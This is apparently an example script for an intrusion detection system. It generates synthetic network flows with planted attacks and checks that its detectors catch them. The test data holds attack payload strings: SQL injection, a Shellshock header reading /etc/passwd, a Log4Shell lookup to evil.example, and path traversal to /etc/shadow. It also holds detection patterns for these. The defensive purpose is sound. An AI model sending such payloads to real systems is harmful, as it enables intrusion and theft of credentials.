// Intrusion detection — a network sensor that turns 300 000 flow records into alerts for port scans, SYN floods,
// SSH brute force, exploit payloads and data exfiltration, then correlates alerts into incidents.
//
// WHAT IT IS
//   The detection layer of a Zeek/Suricata-style NIDS, running on summaries that fit in memory at line rate:
//
//   scans       distinct destination ports per source in a HyperLogLog (12-bit precision is enough to separate 3 ports
//               from 3 000); a source touching > 200 ports in a window is a scanner — unless it is in the security
//               team's allowlisted CIDR (dyna:net Prefix)
//   floods      half-open connections (SYN without ACK) per destination in a CountMinSketch plus distinct SYN
//               sources per destination in a HyperLogLog: many half-open connections from many sources is a flood,
//               from one source it is the scan above; the sketch never undercounts, so no flood is missed
//   brute force failed SSH authentications per (source, target) in a Multiset over a sliding window
//   payloads    one MultiMatcher pass over every payload for SQL injection, Shellshock, Log4Shell and path
//               traversal signatures; counts checked against per-signature regular expressions
//   exfil       outbound bytes per internal host against that host's own p99 baseline (TDigest learned on the
//               first part of the day), to a destination never seen before (BloomFilter of known destinations)
//   incidents   alerts per source go into an IntervalTree; alerts within 10 minutes of each other on the same
//               source are one incident (RangeSet merge); attackers that hit the same victim are linked (UnionFind)
//
// MODULES  dyna:structures (HyperLogLog, CountMinSketch, Multiset, TDigest, BloomFilter, IntervalTree, RangeSet,
//          UnionFind, TopK) · dyna:matcher (MultiMatcher) · dyna:net (Prefix) · dyna:random · dyna:cli
//
// RUN      dynajs examples/security/intrusion-detection.js

import {
    HyperLogLog,
    CountMinSketch,
    Multiset,
    TDigest,
    BloomFilter,
    IntervalTree,
    RangeSet,
    UnionFind,
    TopK,
} from "dyna:structures";
import { MultiMatcher } from "dyna:matcher";
import { Prefix } from "dyna:net";
import { Random } from "dyna:random";
import { Table } from "dyna:cli";

const results = {};
const rng = new Random(1988);
const MIN = 60_000,
    DAY0 = Date.UTC(2026, 9, 25);
const internal = new Prefix("10.20.0.0/16"),
    secTeam = new Prefix("10.20.99.0/24");

// =============================================================================
// Traffic with planted attacks
// =============================================================================
const hosts = Array.from({ length: 400 }, (_, i) => `10.20.${1 + (i >> 6)}.${10 + (i & 63)}`);
const servers = ["10.20.0.5", "10.20.0.6", "10.20.0.7", "10.20.0.8"];
const benignPayloads = [
    "GET /index.html HTTP/1.1",
    "GET /api/v1/items?page=2 HTTP/1.1",
    "POST /login HTTP/1.1 user=alice",
    "GET /static/app.js HTTP/1.1",
    "",
];
const ATTACK = {
    scanner: "198.51.100.23",
    auditor: "10.20.99.7",
    flooder: "203.0.113.0/24",
    brute: "192.0.2.77",
    exploiter: "198.51.100.99",
    exfilHost: hosts[123],
    exfilDest: "185.199.110.42",
};
const flows = [];
const push = (f) => flows.push(f);
for (let i = 0; i < 280_000; i++) {
    const t = DAY0 + rng.nextBounded(24 * 60) * MIN + rng.nextBounded(MIN);
    const src = hosts[rng.nextBounded(hosts.length)];
    const outbound = rng.nextFloat() < 0.4;
    const dst = outbound ? `93.184.${rng.nextBounded(20)}.${rng.nextBounded(50)}` : servers[rng.nextBounded(4)];
    push({
        t,
        src,
        dst,
        dport: outbound ? 443 : [80, 443, 22, 5432][rng.nextBounded(4)],
        flags: "SA",
        bytes: Math.round(rng.exponential(1 / 20_000)),
        payload: benignPayloads[rng.nextBounded(5)],
        auth: "ok",
    });
}
const atMinute = (m) => DAY0 + m * MIN + rng.nextBounded(MIN);
for (let p = 1; p <= 3000; p++)
    push({
        t: atMinute(600 + Math.floor(p / 300)),
        src: ATTACK.scanner,
        dst: servers[0],
        dport: p,
        flags: "S",
        bytes: 0,
        payload: "",
        auth: "",
    });
for (let p = 1; p <= 1500; p++)
    push({
        t: atMinute(800 + Math.floor(p / 300)),
        src: ATTACK.auditor,
        dst: servers[1],
        dport: p,
        flags: "S",
        bytes: 0,
        payload: "",
        auth: "",
    });
for (let i = 0; i < 6000; i++)
    push({
        t: atMinute(900 + Math.floor(i / 1500)),
        src: `203.0.113.${rng.nextBounded(250)}`,
        dst: servers[2],
        dport: 443,
        flags: "S",
        bytes: 0,
        payload: "",
        auth: "",
    });
for (let i = 0; i < 400; i++)
    push({
        t: atMinute(1000 + Math.floor(i / 100)),
        src: ATTACK.brute,
        dst: servers[3],
        dport: 22,
        flags: "SA",
        bytes: 900,
        payload: "",
        auth: "fail",
    });
for (const [m, pl] of [
    [1100, "GET /item?id=1' OR '1'='1 HTTP/1.1"],
    [1101, "GET /cgi-bin/status HTTP/1.1 User-Agent: () { :; }; /bin/cat /etc/passwd"],
    [1102, "GET / HTTP/1.1 X-Api-Version: ${jndi:ldap://evil.example/a}"],
    [1103, "GET /../../../../etc/shadow HTTP/1.1"],
    [1104, "GET /search?q=1 UNION SELECT password FROM users HTTP/1.1"],
])
    push({
        t: atMinute(m),
        src: ATTACK.exploiter,
        dst: servers[0],
        dport: 80,
        flags: "SA",
        bytes: 500,
        payload: pl,
        auth: "",
    });
push({
    t: atMinute(1102),
    src: ATTACK.exploiter,
    dst: servers[3],
    dport: 22,
    flags: "SA",
    bytes: 900,
    payload: "",
    auth: "fail",
});
for (let i = 0; i < 30; i++)
    push({
        t: atMinute(1300 + i),
        src: ATTACK.exfilHost,
        dst: ATTACK.exfilDest,
        dport: 443,
        flags: "SA",
        bytes: 40_000_000,
        payload: "",
        auth: "ok",
    });
flows.sort((a, b) => a.t - b.t);

// =============================================================================
// Detectors (one pass, 5-minute windows)
// =============================================================================
const WINDOW = 5 * MIN;
const SIGS = [
    { name: "sqli", pats: ["' OR '1'='1", "UNION SELECT"], re: /' OR '1'='1|UNION SELECT/ },
    { name: "shellshock", pats: ["() { :; };"], re: /\(\) \{ :; \};/ },
    { name: "log4shell", pats: ["${jndi:"], re: /\$\{jndi:/ },
    { name: "traversal", pats: ["../../"], re: /\.\.\/\.\.\// },
];
const sigOf = SIGS.flatMap((s) => s.pats.map(() => s.name));
const matcher = new MultiMatcher(SIGS.flatMap((s) => s.pats));
const alerts = [];
const alert = (t, src, kind, detail, victim) => alerts.push({ t, src, kind, detail, victim });
const knownDests = new BloomFilter(1 << 20, 7),
    baseline = new Map();
const LEARN_UNTIL = DAY0 + 10 * 3600_000;
let win = -1,
    portsPerSrc,
    synPerDst,
    synSources,
    failPerPair,
    outBytes,
    flagged,
    dstNames,
    firstDst;
const sigCounts = new Multiset(),
    heavyTalkers = new TopK(16);
function closeWindow(end) {
    if (win < 0) return;
    for (const [src, hll] of portsPerSrc) {
        const ports = hll.count();
        if (ports > 200) {
            if (secTeam.contains(src)) flagged.add(`suppressed:${src}`);
            else alert(end, src, "port-scan", `${Math.round(ports)} ports`, firstDst.get(src));
        }
    }
    // A flood is many half-open connections from MANY sources; a single scanner's SYNs are a scan, not a flood.
    for (const dst of dstNames) {
        const n = synPerDst.count(dst);
        if (n > 1000 && synSources.get(dst).count() > 50)
            alert(end, `flood->${dst}`, "syn-flood", `${n} half-open`, dst);
    }
    for (const [pair, n] of failPerPair.entrySet())
        if (n >= 30) {
            const [src, dst] = pair.split(">");
            alert(end, src, "ssh-brute-force", `${n} failures`, dst);
        }
    for (const [key, bytes] of outBytes) {
        const [host, dst] = key.split(">");
        const d = baseline.get(host);
        if (d && !knownDests.mayContain(dst) && bytes > 20 * d.quantile(0.99))
            alert(end, host, "exfiltration", `${(bytes / 1e6).toFixed(0)} MB to ${dst}`, dst);
    }
}
const t0 = performance.now();
for (const f of flows) {
    const w = Math.floor((f.t - DAY0) / WINDOW);
    if (w !== win) {
        closeWindow(DAY0 + win * WINDOW + WINDOW);
        win = w;
        portsPerSrc = new Map();
        synPerDst = new CountMinSketch(2048, 4);
        synSources = new Map();
        firstDst = new Map();
        failPerPair = new Multiset();
        outBytes = new Map();
        dstNames = new Set();
        flagged ??= new Multiset();
    }
    (portsPerSrc.get(f.src) ?? portsPerSrc.set(f.src, new HyperLogLog(12)).get(f.src)).add(String(f.dport));
    if (!firstDst.has(f.src)) firstDst.set(f.src, f.dst);
    if (f.flags === "S") {
        synPerDst.add(f.dst);
        dstNames.add(f.dst);
        (synSources.get(f.dst) ?? synSources.set(f.dst, new HyperLogLog(10)).get(f.dst)).add(f.src);
    }
    if (f.auth === "fail") failPerPair.add(`${f.src}>${f.dst}`);
    if (f.payload)
        for (const m of matcher.allIn(f.payload)) {
            sigCounts.add(sigOf[m.index]);
            alert(f.t, f.src, `exploit:${sigOf[m.index]}`, f.payload.truncate(40), f.dst);
        }
    if (internal.contains(f.src) && !internal.contains(f.dst)) {
        if (f.bytes > 0) heavyTalkers.add(f.src, f.bytes);
        if (f.t < LEARN_UNTIL) {
            knownDests.add(f.dst);
            (baseline.get(f.src) ?? baseline.set(f.src, new TDigest(50)).get(f.src)).add(f.bytes);
        } else {
            const k = `${f.src}>${f.dst}`;
            outBytes.set(k, (outBytes.get(k) ?? 0) + f.bytes);
        }
    }
}
closeWindow(DAY0 + win * WINDOW + WINDOW);
const scanMs = performance.now() - t0;

// =============================================================================
// Correlation into incidents
// =============================================================================
const bySrc = new Map();
for (const a of alerts) {
    const k = a.kind === "syn-flood" ? a.src : a.src;
    (bySrc.get(k) ?? bySrc.set(k, new IntervalTree()).get(k)).insert(a.t, a.t + 10 * MIN, a);
}
const incidents = [];
for (const [src, tree] of bySrc) {
    const merged = new RangeSet();
    for (const a of alerts.filter((x) => x.src === src)) merged.add(a.t, a.t + 10 * MIN);
    for (const [lo, hi] of merged.ranges()) {
        const members = tree.overlapping(lo, hi).map(([, , a]) => a);
        incidents.push({
            src,
            lo,
            kinds: [...new Set(members.map((a) => a.kind))].sort(),
            n: members.length,
            victims: [...new Set(members.map((a) => a.victim).filter(Boolean))],
        });
    }
}
const ids = new Map([...new Set(incidents.map((i) => i.src))].map((s, k) => [s, k]));
const uf = new UnionFind(ids.size);
const byVictim = new Map();
for (const inc of incidents)
    for (const v of inc.victims) {
        const prev = byVictim.get(v);
        if (prev !== undefined) uf.union(prev, ids.get(inc.src));
        else byVictim.set(v, ids.get(inc.src));
    }

// =============================================================================
// Checks
// =============================================================================
const kindsFor = (src) => new Set(alerts.filter((a) => a.src === src).map((a) => a.kind));
results["the external scanner is detected"] = kindsFor(ATTACK.scanner).has("port-scan");
results["the allowlisted auditor's scan is suppressed, not alerted"] =
    !kindsFor(ATTACK.auditor).size && flagged.count(`suppressed:${ATTACK.auditor}`) > 0;
results["the SYN flood on its target is detected"] = alerts.some(
    (a) => a.kind === "syn-flood" && a.victim === servers[2],
);
results["SSH brute force is detected"] = kindsFor(ATTACK.brute).has("ssh-brute-force");
results["all four exploit families are detected"] = ["sqli", "shellshock", "log4shell", "traversal"].every((s) =>
    kindsFor(ATTACK.exploiter).has(`exploit:${s}`),
);
// MultiMatcher reports every occurrence, overlapping ones included ("../../../../" holds "../../" three times), so the
// regex oracle counts with a zero-width lookahead, which also finds overlaps.
results["signature counts equal per-signature regex counts"] = SIGS.every(
    (s) =>
        sigCounts.count(s.name) ===
        flows.reduce((n, f) => n + (f.payload.match(new RegExp(`(?=(?:${s.re.source}))`, "g")) ?? []).length, 0),
);
results["exfiltration to a never-seen destination is detected"] = alerts.some(
    (a) => a.kind === "exfiltration" && a.src === ATTACK.exfilHost && a.victim === ATTACK.exfilDest,
);
const attackerSrcs = new Set([
    ATTACK.scanner,
    ATTACK.brute,
    ATTACK.exploiter,
    ATTACK.exfilHost,
    `flood->${servers[2]}`,
]);
const falsePositives = alerts.filter((a) => !attackerSrcs.has(a.src));
results["no benign host raises an alert"] = falsePositives.length === 0;
results["the exploiter's alerts form one incident"] = incidents.filter((i) => i.src === ATTACK.exploiter).length === 1;
results["attackers sharing a victim are linked"] =
    uf.connected(ids.get(ATTACK.scanner), ids.get(ATTACK.exploiter)) &&
    !uf.connected(ids.get(ATTACK.scanner), ids.get(ATTACK.brute));
results["the exfiltrating host tops the outbound byte TopK"] =
    heavyTalkers.list().sort((a, b) => b[1] - a[1])[0][0] === ATTACK.exfilHost;
print(
    Table(
        incidents
            .sort((a, b) => a.lo - b.lo)
            .map((i) => [
                new Date(i.lo).toISOString().slice(11, 16),
                i.src,
                i.kinds.join(", ").truncate(50),
                i.n,
                i.victims.join(" ").truncate(30),
            ]),
        { head: ["start", "source", "kinds", "alerts", "victims"] },
    ),
);
print(
    `${flows.length.format()} flows in ${scanMs.toFixed(0)} ms (${Math.round(flows.length / (scanMs / 1000)).format()} flows/s); ${alerts.length} alerts, ${incidents.length} incidents`,
);

check(results);

function check(results) {
    const names = Object.keys(results);
    const failed = names.filter((name) => !results[name]);
    for (const name of failed) print("FAIL " + name);
    if (failed.length) throw new Error(`${failed.length} of ${names.length} checks failed`);
}
